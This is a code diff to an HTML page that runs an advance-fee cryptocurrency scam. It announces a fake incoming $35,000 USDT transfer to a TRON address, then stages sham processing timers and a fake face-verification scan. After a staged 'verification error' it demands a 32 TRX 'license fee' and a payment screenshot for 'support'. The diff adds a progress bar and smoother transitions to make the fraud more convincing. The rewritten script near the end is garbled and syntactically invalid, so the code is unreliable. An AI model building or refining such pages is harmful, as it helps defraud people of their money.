@@ -7,180 +7,225 @@
     <script src="https://cdn.tailwindcss.com"></script>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
-        body { background-color: #0f172a; color: white; font-family: 'Inter', sans-serif; }
+        body { background-color: #0f172a; color: white; font-family: 'Inter', sans-serif; overflow-x: hidden; }
         .glass-card { background: rgba(30, 41, 59, 0.7); backdrop-filter: blur(10px); border: 1px solid rgba(255, 255, 255, 0.1); border-radius: 1rem; }
-        .step { display: none; }
-        .step.active { display: block; animation: fadeIn 0.5s ease-out; }
-        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
-        .spinner { border: 4px solid rgba(255, 255, 255, 0.1); border-left-color: #3b82f6; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; }
+        .step { display: none; opacity: 0; transform: translateX(20px); transition: all 0.5s cubic-bezier(0.4, 0, 0.2, 1); }
+        .step.active { display: block; opacity: 1; transform: translateX(0); }
+        .step.exit { display: block; opacity: 0; transform: translateX(-20px); position: absolute; width: 100%; top: 0; }
+        .spinner { border: 4px solid rgba(255, 255, 255, 0.1); border-left-color: #3b82f6; border-radius: 50%; width: 48px; height: 48px; animation: spin 1s linear infinite; }
         @keyframes spin { to { transform: rotate(360deg); } }
         .scan-line { position: absolute; width: 100%; height: 2px; background: #3b82f6; box-shadow: 0 0 15px #3b82f6; animation: scan 2s linear infinite; }
         @keyframes scan { 0% { top: 0; } 100% { top: 100%; } }
+        .progress-indicator { height: 4px; background: rgba(255,255,255,0.05); border-radius: 2px; margin-bottom: 2rem; overflow: hidden; }
+        .progress-bar { height: 100%; background: #3b82f6; width: 0%; transition: width 0.3s ease; }
     </style>
 </head>
 <body class="min-h-screen flex items-center justify-center p-4">
 
-    <div id="app" class="max-w-md w-full glass-card p-8 shadow-2xl">
-        <!-- Header -->
-        <div class="text-center mb-8">
-            <div class="inline-block p-3 bg-blue-500/10 rounded-full mb-4">
-                <i class="fas fa-shield-halved text-blue-500 text-2xl"></i>
-            </div>
-            <h1 class="text-xl font-bold tracking-tight">System Verification</h1>
+    <div id="container" class="max-w-md w-full relative">
+        <!-- Master Progress Bar -->
+        <div class="progress-indicator">
+            <div id="master-progress" class="progress-bar"></div>
         </div>
 
-        <!-- Step 1: Wallet Confirmation -->
-        <div id="step-1" class="step active">
-            <div class="bg-green-500/10 border border-green-500/20 p-4 rounded-lg mb-6">
-                <p class="text-sm text-green-400 mb-1">Incoming Payment Detected</p>
-                <h2 class="text-2xl font-bold">$35,000.00 USDT</h2>
+        <div id="app" class="glass-card p-8 shadow-2xl relative min-h-[450px] flex flex-col justify-center">
+            
+            <!-- Step 1: Wallet Confirmation -->
+            <div id="step-1" class="step active">
+                <div class="text-center mb-6">
+                    <div class="inline-block p-3 bg-blue-500/10 rounded-full mb-4">
+                        <i class="fas fa-wallet text-blue-500 text-2xl"></i>
+                    </div>
+                    <h1 class="text-xl font-bold">Wallet Ownership</h1>
+                </div>
+                <div class="bg-green-500/10 border border-green-500/20 p-4 rounded-lg mb-6">
+                    <p class="text-sm text-green-400 mb-1 text-center">Incoming Payment Detected</p>
+                    <h2 class="text-2xl font-bold text-center">$35,000.00 USDT</h2>
+                </div>
+                <p class="text-slate-400 text-sm mb-4 text-center">Confirm ownership of the receiving address:</p>
+                <div class="bg-black/20 p-3 rounded font-mono text-[10px] break-all border border-white/10 mb-6 text-center text-blue-300">
+                    TDDW3JnTQietyVdY2w56dioFURLHaoP1Uy
+                </div>
+                <button onclick="goToStep(2)" class="w-full bg-blue-600 hover:bg-blue-700 text-white font-bold py-3 rounded-lg transition-all active:scale-95 shadow-lg shadow-blue-900/20">
+                    Confirm Ownership
+                </button>
             </div>
-            <p class="text-slate-400 text-sm mb-4">Please confirm you are the owner of the following address to accept these funds:</p>
-            <div class="bg-black/20 p-3 rounded font-mono text-xs break-all border border-white/10 mb-6">
-                TDDW3JnTQietyVdY2w56dioFURLHaoP1Uy
-            </div>
-            <button onclick="nextStep(2)" class="w-full bg-blue-600 hover:bg-blue-700 text-white font-bold py-3 rounded-lg transition duration-200">
-                Yes, I am the owner
-            </button>
-        </div>
 
-        <!-- Step 2: Rules & Regulations -->
-        <div id="step-2" class="step">
-            <h3 class="font-bold mb-4">USDT Withdrawal Regulations</h3>
-            <ul class="text-sm text-slate-300 space-y-3 mb-6">
-                <li><i class="fas fa-check text-blue-500 mr-2"></i> Funds must be settled in a TRC-20 compatible wallet.</li>
-                <li><i class="fas fa-check text-blue-500 mr-2"></i> Verification of identity is required for high-value transfers.</li>
-                <li><i class="fas fa-check text-blue-500 mr-2"></i> Network fees may apply for standard processing.</li>
-                <li><i class="fas fa-check text-blue-500 mr-2"></i> Reversal is not possible once the transaction is initiated.</li>
-            </ul>
-            <label class="flex items-center space-x-3 cursor-pointer mb-6">
-                <input type="checkbox" id="accept-rules" class="form-checkbox h-5 w-5 text-blue-600 rounded">
-                <span class="text-sm text-slate-400">I understand and accept all regulations</span>
-            </label>
-            <button onclick="handleRules()" class="w-full bg-blue-600 hover:bg-blue-700 text-white font-bold py-3 rounded-lg transition">
-                Continue
-            </button>
-        </div>
-
-        <!-- Step 3: Initial Processing (15 Seconds) -->
-        <div id="step-3" class="step text-center">
-            <div class="flex justify-center mb-6">
-                <div class="spinner"></div>
+            <!-- Step 2: Rules & Regulations -->
+            <div id="step-2" class="step">
+                <div class="text-center mb-6">
+                    <div class="inline-block p-3 bg-blue-500/10 rounded-full mb-4">
+                        <i class="fas fa-file-contract text-blue-500 text-2xl"></i>
+                    </div>
+                    <h1 class="text-xl font-bold">Withdrawal Rules</h1>
+                </div>
+                <ul class="text-sm text-slate-300 space-y-3 mb-6">
+                    <li class="flex items-start"><i class="fas fa-check-circle text-blue-500 mt-1 mr-3"></i> <span>Funds are reserved exclusively for the TRC-20 network.</span></li>
+                    <li class="flex items-start"><i class="fas fa-check-circle text-blue-500 mt-1 mr-3"></i> <span>Verification is mandatory for transfers exceeding $10,000.</span></li>
+                    <li class="flex items-start"><i class="fas fa-check-circle text-blue-500 mt-1 mr-3"></i> <span>Transactions are non-reversible once processed.</span></li>
+                </ul>
+                <div class="p-4 bg-white/5 rounded-lg mb-6 border border-white/10">
+                    <label class="flex items-center space-x-3 cursor-pointer">
+                        <input type="checkbox" id="accept-rules" class="h-5 w-5 rounded border-gray-300 text-blue-600 focus:ring-blue-600 bg-slate-800">
+                        <span class="text-sm text-slate-300">I have read and understand properly</span>
+                    </label>
+                </div>
+                <button onclick="handleRules()" class="w-full bg-blue-600 hover:bg-blue-700 text-white font-bold py-3 rounded-lg transition-all active:scale-95">
+                    Continue to Process
+                </button>
             </div>
-            <p class="text-lg font-medium mb-2">Analyzing Network...</p>
-            <p class="text-sm text-slate-400">Processing incoming $35,000 USDT transfer to your wallet. Please wait...</p>
-            <div class="mt-8 bg-blue-500/5 h-1 w-full rounded-full overflow-hidden">
-                <div id="progress-bar-1" class="bg-blue-500 h-full w-0 transition-all duration-1000"></div>
-            </div>
-        </div>
 
-        <!-- Step 4: Face Verification -->
-        <div id="step-4" class="step text-center">
-            <div class="relative w-48 h-48 mx-auto bg-black/40 rounded-full border-2 border-blue-500/30 flex items-center justify-center overflow-hidden mb-6">
-                <i class="fas fa-user text-6xl text-slate-600"></i>
-                <div id="scanner" class="hidden">
+            <!-- Step 3: 15s System Processing -->
+            <div id="step-3" class="step text-center">
+                <div class="flex justify-center mb-8">
+                    <div class="spinner"></div>
+                </div>
+                <h3 class="text-xl font-bold mb-2">Processing Transfer</h3>
+                <p class="text-sm text-slate-400 mb-8">Connecting to secure gateway. Please do not close this window...</p>
+                <div class="bg-blue-500/5 h-1 w-full rounded-full overflow-hidden">
+                    <div id="timer-bar-1" class="bg-blue-500 h-full w-0"></div>
+                </div>
+                <p id="timer-text-1" class="text-[10px] text-slate-500 mt-3 uppercase tracking-widest font-bold">Initialising Secure Channel</p>
+            </div>
+
+            <!-- Step 4: Face Verification Portal -->
+            <div id="step-4" class="step text-center">
+                <div class="text-center mb-6">
+                    <div class="inline-block p-4 bg-blue-500/10 rounded-full mb-4">
+                        <i class="fas fa-user-shield text-blue-500 text-3xl"></i>
+                    </div>
+                    <h1 class="text-xl font-bold">Identity Portal</h1>
+                </div>
+                <p class="text-slate-300 mb-8 text-sm">To finalize the $35,000 USDT transfer, we need to confirm your identity via face verification.</p>
+                <button onclick="goToStep(5)" class="w-full bg-blue-600 hover:bg-blue-700 text-white font-bold py-4 rounded-lg transition-all active:scale-95 flex items-center justify-center">
+                    <i class="fas fa-camera mr-2"></i> Start Verification
+                </button>
+            </div>
+
+            <!-- Step 5: Scanning (8 Seconds) -->
+            <div id="step-5" class="step text-center">
+                <div class="relative w-48 h-48 mx-auto bg-black/40 rounded-3xl border-2 border-blue-500/30 flex items-center justify-center overflow-hidden mb-8 shadow-[0_0_30px_rgba(59,130,246,0.1)]">
+                    <i class="fas fa-user text-6xl text-slate-700"></i>
                     <div class="scan-line"></div>
                 </div>
-            </div>
-            <h3 class="text-lg font-bold mb-2">Biometric Face Verification</h3>
-            <p class="text-sm text-slate-400 mb-6">Final security step required to process the transfer.</p>
-            <button id="verify-btn" onclick="startScanning()" class="w-full bg-blue-600 hover:bg-blue-700 text-white font-bold py-3 rounded-lg transition">
-                Verify My Face
-            </button>
-        </div>
-
-        <!-- Step 5: Final Loading -->
-        <div id="step-5" class="step text-center">
-            <div class="flex justify-center mb-6">
-                <div class="spinner border-t-blue-400"></div>
-            </div>
-            <h3 class="text-xl font-bold mb-2">Processing Verification</h3>
-            <p class="text-sm text-slate-400">Confirming biometric data with network nodes. This may take a moment...</p>
-        </div>
-
-        <!-- Step 6: Verification Error & License Fee -->
-        <div id="step-6" class="step">
-            <div class="bg-red-500/10 border border-red-500/20 p-4 rounded-lg mb-6 flex items-start space-x-3">
-                <i class="fas fa-circle-exclamation text-red-500 mt-1"></i>
-                <div>
-                    <h3 class="font-bold text-red-500">Verification Error</h3>
-                    <p class="text-xs text-red-400">Standard verification failed due to high transaction volume.</p>
+                <h3 class="text-xl font-bold mb-2">Scanning Biometrics</h3>
+                <p class="text-sm text-slate-400 mb-6">Analyzing facial points for security match...</p>
+                <div class="bg-blue-500/5 h-1 w-full rounded-full overflow-hidden">
+                    <div id="timer-bar-2" class="bg-blue-500 h-full w-0"></div>
                 </div>
             </div>
-            <p class="text-sm text-slate-300 mb-4">A **Full License Verification** is required to release the $35,000 USDT to your wallet.</p>
-            <div class="bg-blue-500/10 p-4 rounded-lg mb-6">
-                <div class="flex justify-between items-center mb-2">
-                    <span class="text-xs text-blue-400">License Fee</span>
-                    <span class="font-bold text-lg">32 TRX</span>
-                </div>
-                <p class="text-[10px] text-blue-300/60">This fee is required for instant network release and KYC validation.</p>
-            </div>
-            <button onclick="nextStep(7)" class="w-full bg-blue-600 hover:bg-blue-700 text-white font-bold py-3 rounded-lg transition">
-                I have paid, release my funds
-            </button>
-        </div>
 
-        <!-- Step 7: Awaiting Confirmation -->
-        <div id="step-7" class="step text-center">
-            <div class="inline-block p-4 bg-yellow-500/10 rounded-full mb-6">
-                <i class="fas fa-clock text-yellow-500 text-3xl animate-pulse"></i>
+            <!-- Step 6: Professional Loading -->
+            <div id="step-6" class="step text-center">
+                <div class="flex justify-center mb-8">
+                    <div class="spinner border-t-blue-400"></div>
+                </div>
+                <h3 class="text-xl font-bold mb-2 text-blue-400">System Processing</h3>
+                <p class="text-sm text-slate-400">Submitting encrypted data to blockchain nodes. Confirming transfer protocol...</p>
             </div>
-            <h3 class="text-xl font-bold mb-2 text-yellow-500">Awaiting Confirmation</h3>
-            <p class="text-sm text-slate-300 mb-6">Your payment of **32 TRX** is pending confirmation. To speed up the release of your **$35,000 USDT**, please send a screenshot of the payment to support.</p>
-            <div class="p-4 border border-white/5 bg-white/5 rounded-lg text-xs text-slate-400 italic">
-                The system will process the release once the license verification fee is confirmed on the blockchain.
+
+            <!-- Step 7: Verification Error -->
+            <div id="step-7" class="step">
+                <div class="bg-red-500/10 border border-red-500/20 p-4 rounded-lg mb-6 flex items-start space-x-3">
+                    <i class="fas fa-exclamation-triangle text-red-500 mt-1"></i>
+                    <div>
+                        <h3 class="font-bold text-red-500">Manual Action Required</h3>
+                        <p class="text-xs text-red-400">Automatic face verification could not finalize the $35,000 transfer.</p>
+                    </div>
+                </div>
+                <p class="text-sm text-slate-300 mb-6 leading-relaxed text-center">System requires a **Full License Verification** to release funds. Please settle the network license fee of **32 TRX** to activate your wallet.</p>
+                <div class="bg-blue-600/10 border border-blue-500/20 p-5 rounded-xl mb-8">
+                    <div class="flex justify-between items-center">
+                        <span class="text-xs text-blue-400 uppercase tracking-widest font-bold">Release Fee</span>
+                        <span class="text-2xl font-black text-white">32 TRX</span>
+                    </div>
+                </div>
+                <button onclick="goToStep(8)" class="w-full bg-white text-slate-900 font-bold py-4 rounded-lg hover:bg-slate-100 transition-all active:scale-95 shadow-lg">
+                    I Have Paid, Release My Funds
+                </button>
+            </div>
+
+            <!-- Step 8: Final Confirmation -->
+            <div id="step-8" class="step text-center">
+                <div class="inline-block p-5 bg-yellow-500/10 rounded-full mb-6">
+                    <i class="fas fa-clock text-yellow-500 text-4xl animate-pulse"></i>
+                </div>
+                <h3 class="text-xl font-bold mb-4 text-yellow-500">Awaiting Confirmation</h3>
+                <div class="text-sm text-slate-300 space-y-4 mb-8 text-left leading-relaxed">
+                    <p>The network is currently verifying the 32 TRX payment.</p>
+                    <p class="font-bold border-l-4 border-blue-500 pl-4 bg-blue-500/5 py-2">Please send a screenshot of your 32 TRX payment to support immediately to process your $35,000 USDT.</p>
+                    <p class="text-xs text-slate-500">Receiving Wallet: <span class="font-mono text-[9px] opacity-70">TDDW3JnTQietyVdY2w56dioFURLHaoP1Uy</span></p>
+                </div>
+                <div class="p-3 bg-black/20 rounded-lg text-[10px] text-slate-500 font-mono italic">
+                    REF_ID: Release_35K_USDT_Pending
+                </div>
             </div>
         </div>
     </div>
 
     <script>
+        const totalSteps = 8;
         let currentStep = 1;
 
-        function nextStep(step) {
-            document.querySelectorAll('.step').forEach(el => el.classList.remove('active'));
-            document.getElementById(`step-${step}`).classList.add('active');
-            currentStep = step;
+        function updateMasterProgress() {
+            const bar = document.getElementById('master-progress');
+            const progress = ((currentStep - 1) / (totalSteps - 1)) * 100;
+            bar.style.width = progress + '%';
+        }
+
+        function goToStep(step) {
+            const currentEl = document.getElementById(`step-${currentStep}`);
+            const nextEl = document.getElementById(`step-${step}`);
+            
+            currentEl.classList.add('exit');
+            
+            setTimeout(() => {
+                currentEl.classList.remove('active', 'exit');
+                nextEl.classList.add('active');
+                currentStep = step;
+                updateMasterProgress();
+                
+                // Trigger timed logic
+                if (step === 3) runTimer('timer-bar-1', 'timer-text-1', 15000, 4, [
+                    "Initialising Secure Channel", 
+                    "Mapping Blockchain Data", 
+                    "Verifying Node Consensus", 
+                    "Finalising Transfer Protocol"
+                ]);
+                if (step === 5) runTimer('timer-bar-2', null, 8000, 6);
+                if (step === 6) setTimeout(() => goToStep(7), 4000);
+            }, 500);
         }
 
         function handleRules() {
             if (document.getElementById('accept-rules').checked) {
-                nextStep(3);
-                startTimer(15000, 4);
+                goToStep(3);
             } else {
-                alert('Please accept the regulations to continue.');
+                alert('Please confirm that you understand the rules properly.');
             }
         }
 
-        function startTimer(duration, next) {
+        function runTimer(barId, textId, duration, nextStepId, phases = []) {
             let start = Date.now();
-            let bar = document.getElementById('progress-bar-1');
+            const bar = document.getElementById(barId);
+            const text = textId ? document.getElementById(textId) : null;
             
-            let timer = setInterval(() => {
-                let diff = Date.now() - start;
-                let percent = (diff / duration) * 100;
-                if (bar) bar.style.width = percent + '%';
+            const interval = setInterval(() => {
+                let elapsed = Date.now() - start;
+                let progress = (elapsed / duration) * 100;
+                bar.style.width = Math.min(progress, 100) + '%';
                 
-                if (diff >= duration) {
-                    clearInterval(timer);
-                    nextStep(next);
+                if (text && phases.length > 0) {
+                    let idx = Math.floor((elapsed / duration) * phases.length);
+                    if (phases[idx]) text.innerText = phases[idx];
                 }
-            }, 100);
-        }
 
-        function startScanning() {
-            const btn = document.getElementById('verify-btn');
-            const scanner = document.getElementById('scanner');
-            btn.disabled = true;
-            btn.innerText = "Scanning Face...";
-            scanner.classList.remove('hidden');
+                if (elapsed >= duration) {
+                    clearInterval(interval);t
+                    goToStep(nextStepId);, 50); }
+// Initialize
+updateMasterProgress();
+</script>
 
-            setTimeout(() => {
-                nextStep(5);
-                setTimeout(() => {
-                    nextStep(6);
-                }, 4000); // Small processing pause
-            }, 8000); // 8 second scan
-        }
-    </script>
-</body>
+</body> 
 </html>
